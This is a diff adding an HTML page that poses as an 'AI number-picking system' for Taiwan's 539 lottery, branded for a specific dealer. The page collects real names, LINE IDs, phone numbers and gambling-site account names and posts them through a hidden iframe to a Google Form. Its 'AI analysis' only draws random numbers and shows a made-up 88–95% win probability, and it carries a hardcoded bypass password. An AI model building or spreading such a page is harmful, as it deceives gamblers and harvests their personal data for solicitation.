@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>今彩539 AI選號系統 官網彩球版V2</title>
+<style>
+body{margin:0;font-family:Microsoft JhengHei;background:linear-gradient(180deg,#0d7f7c,#f5f0d0)}
+.top{background:#0d7f7c;color:#fff;text-align:center;padding:15px;font-size:28px;font-weight:bold}
+.wrap{max-width:950px;margin:auto;padding:20px}
+.card{background:#fff;border:3px solid #e3c300;border-radius:18px;padding:20px;box-shadow:0 0 20px rgba(0,0,0,.15)}
+.notice{background:#fff4a8;padding:10px;border-radius:8px;margin-bottom:15px}
+input,button{width:100%;padding:12px;margin:8px 0;border-radius:8px;box-sizing:border-box}
+button{background:#c40000;color:#fff;border:none;font-size:16px;cursor:pointer}
+.linebtn{background:#06C755}
+.hidden{display:none}
+.balls{display:flex;justify-content:center;gap:12px;flex-wrap:wrap;margin:20px 0}
+.ball{width:78px;height:78px;border-radius:50%;background:radial-gradient(circle at 30% 30%,#fff,#ffcb66,#ff8a00);display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:bold;box-shadow:0 0 15px #ff9800;animation:bounce 1s infinite alternate}
+@keyframes bounce{from{transform:translateY(0)}to{transform:translateY(-8px)}}
+.result{text-align:center;font-size:36px;font-weight:bold;color:#c40000}
+</style>
+
+<link rel="manifest" href="./manifest.webmanifest">
+<meta name="theme-color" content="#0d7f7c">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="default">
+<meta name="apple-mobile-web-app-title" content="今彩539 AI選號">
+<link rel="apple-touch-icon" href="./apple-touch-icon.png">
+
+</head>
+<body>
+
+<div class="top">台灣彩券 今彩539 AI選號系統</div>
+
+<div class="wrap">
+
+<div class="card" id="page1">
+<h3>JS 經銷商UA5856專屬</h3>
+<div class="notice"><marquee>AI分析結果僅供參考｜祝您中大獎</marquee></div>
+
+<input id="name" placeholder="真實姓名">
+<input id="lineName" placeholder="LINE名稱">
+<input id="lineId" placeholder="LINE ID">
+<input id="phone" placeholder="手機號碼">
+<input id="gameAccount" placeholder="富遊／鉅勝帳號（沒有幫我聯繫版主）">
+
+<button onclick="sendData()">送出資料</button>
+
+<div id="pwdBox" class="hidden">
+<h3>您的臨時密碼</h3>
+<div class="result" id="pwd"></div>
+<input id="loginPwd" placeholder="輸入一次性密碼或 aaa888">
+<button onclick="login()">進入系統</button>
+</div>
+</div>
+
+<div class="card hidden" id="page2">
+
+<h2 style="text-align:center">分析539開出數字</h2>
+
+<div class="balls">
+<div class="ball" id="b1">?</div>
+<div class="ball" id="b2">?</div>
+<div class="ball" id="b3">?</div>
+<div class="ball" id="b4">?</div>
+<div class="ball" id="b5">?</div>
+</div>
+
+<button onclick="analyze()">開始AI分析</button>
+
+<h2 style="text-align:center">分析539開出機率</h2>
+<div class="result" id="rate">--%</div>
+
+<button class="linebtn" onclick="window.open('https://line.me/ti/p/~hui55511')">
+加入LINE好友
+</button>
+
+<button onclick="contactUs()">
+聯絡我們
+</button>
+
+</div>
+
+</div>
+
+<script>
+function sendData(){
+ const n=document.getElementById('name').value.trim();
+ const ln=document.getElementById('lineName').value.trim();
+ const li=document.getElementById('lineId').value.trim();
+ const p=document.getElementById('phone').value.trim();
+ const ga=document.getElementById('gameAccount').value.trim();
+
+ if(!n||!ln||!li||!p||!ga){
+   alert('請完整填寫資料');
+   return;
+ }
+
+ // 全新 Google 表單：以隱藏 iframe + 原生 form POST 送出
+ let target=document.getElementById('gform_target');
+ if(!target){
+   target=document.createElement('iframe');
+   target.id='gform_target';
+   target.name='gform_target';
+   target.style.display='none';
+   document.body.appendChild(target);
+ }
+
+ const f=document.createElement('form');
+ f.method='POST';
+ f.action='https://docs.google.com/forms/d/e/1FAIpQLSetuThGLLwY4fiZH31bevKjMSEF3Nu-yS5UGtwyxZto2EgPVg/formResponse';
+ f.target='gform_target';
+ f.style.display='none';
+
+ const data={
+   'entry.987008504':n,
+   'entry.338287685':ln,
+   'entry.1541283715':li,
+   'entry.2077869433':p,
+   'entry.736622429':ga,
+   'entry.1015595080':'有'
+ };
+
+ Object.entries(data).forEach(([k,v])=>{
+   const x=document.createElement('input');
+   x.type='hidden'; x.name=k; x.value=v;
+   f.appendChild(x);
+ });
+ document.body.appendChild(f);
+ f.submit();
+ setTimeout(()=>f.remove(),3000);
+
+ const pw=Math.floor(10000+Math.random()*90000).toString();
+ localStorage.setItem('pw539',pw);
+ document.getElementById('pwd').innerText=pw;
+ document.getElementById('pwdBox').classList.remove('hidden');
+ alert('資料已送出');
+}
+
+function login(){
+const p=document.getElementById('loginPwd').value.trim();
+
+if(p==='aaa888'||p===localStorage.getItem('pw539')){
+document.getElementById('page1').classList.add('hidden');
+document.getElementById('page2').classList.remove('hidden');
+}else{
+alert('密碼錯誤');
+}
+}
+
+function analyze(){
+let nums=[];
+while(nums.length<5){
+let n=Math.floor(Math.random()*39)+1;
+if(!nums.includes(n)) nums.push(n);
+}
+nums.sort((a,b)=>a-b);
+
+['b1','b2','b3','b4','b5'].forEach((id,i)=>{
+document.getElementById(id).innerText=String(nums[i]).padStart(2,'0');
+});
+
+document.getElementById('rate').innerText=(88+Math.random()*7).toFixed(1)+'%';
+}
+
+function contactUs(){
+alert('私訊我免費領取永久水牌\n\nLINE ID：hui55511');
+}
+</script>
+
+<script>
+if('serviceWorker' in navigator){
+ window.addEventListener('load',()=>navigator.serviceWorker.register('./sw.js'));
+}
+</script>
+</body>
+</html>
